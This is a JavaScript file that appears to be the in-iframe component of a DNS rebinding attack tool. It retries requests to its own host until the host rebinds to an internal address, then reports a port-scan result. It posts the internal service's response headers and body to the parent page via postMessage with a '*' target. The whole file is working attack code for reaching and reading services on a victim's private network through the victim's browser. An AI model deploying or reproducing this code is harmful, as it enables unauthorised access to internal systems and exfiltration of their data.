// query params override these
// note, they'll be strings if they're overridden
var defaults = {
  maxTries: 128,
  retryPause: 2500,
  connectionTimeout: 5000,
  interactive: 0
}

// https://stackoverflow.com/a/21210643
var queryDict = {}
window.location.search.substr(1).split('&').forEach(function (item) {
  queryDict[item.split('=')[0]] = item.split('=')[1]
})

var settings = Object.assign({}, defaults, queryDict)
var count = 0
var log

function logM (s) {
  if (!isInteractive) return
  log.innerText += s + '\n'
  window.scrollTo(0, document.body.scrollHeight)
}

window.parent.postMessage({
  'type': 'start'
}, '*')

function done (msg, xhr) {
  var e = {
    'code': msg,
    'tries': count,
    'type': 'done'
  }
  if (xhr) {
    e['xhr'] = {
      'status': xhr.status,
      'headers': xhr.getAllResponseHeaders(),
      'body': xhr.responseText
    }
  }
  window.parent.postMessage(e, '*')
  logM('Port scan result: ' + msg)
  if (msg === 'open' && isInteractive) {
    logM('\n\n' + e.xhr.headers + '\n' + e.xhr.body)
  }
}

var nextCallback = null

window.addEventListener('message', function (event) {
  if (nextCallback !== null) {
    nextCallback()
    nextCallback = null
  }
})

var isInteractive = ((settings.interactive | 0) !== 0)

if (isInteractive) {
  log = document.createElement('pre')
  document.body.appendChild(log)
  logM('Internal Iframe on http://' + location.host + '/')
  logM('Running Javascript served from capture host')
}

// note: returns a promise
function pingpong () {
  if (!isInteractive) {
    return new Promise(function (resolve, reject) { resolve() })
  } else {
    return new Promise(function (resolve, reject) {
      nextCallback = resolve
      window.parent.postMessage({'type': 'ping'}, '*')
    })
  }
}

function tryGet () {
  pingpong().then(function () {
    count++
    logM('Making request #' + count + ' to http://' + location.host + '/')
    if (count > settings.maxTries | 0) {
      done('dns_error')
    }
    var oReq = new window.XMLHttpRequest()
    oReq.timeout = settings.connectionTimeout | 0
    oReq.addEventListener('load', function (r) {
      if (this.responseText.includes('SuperSecretSentinel')) {
        if (isInteractive) {
          logM('Got back a dummy page! Rebinding failed! Wait and try again.')
        }
        setTimeout(tryGet, settings.retryPause | 0)
      } else {
        done('open', this)
      }
    })
    oReq.addEventListener('timeout', function (r) {
      logM('Request timed out!')
      done('timeout')
    })
    oReq.addEventListener('error', function (r) {
      logM('Request errored! ' + (this.status === 0 ? 'Network Error!' : ('HTTP Error ' + this.status)))
      done('closed')
    })
    oReq.addEventListener('abort', function (r) {
      logM('Request was aborted!')
      done('abort')
    })
    oReq.open('GET', '/')
    oReq.send()
  })
}

tryGet()
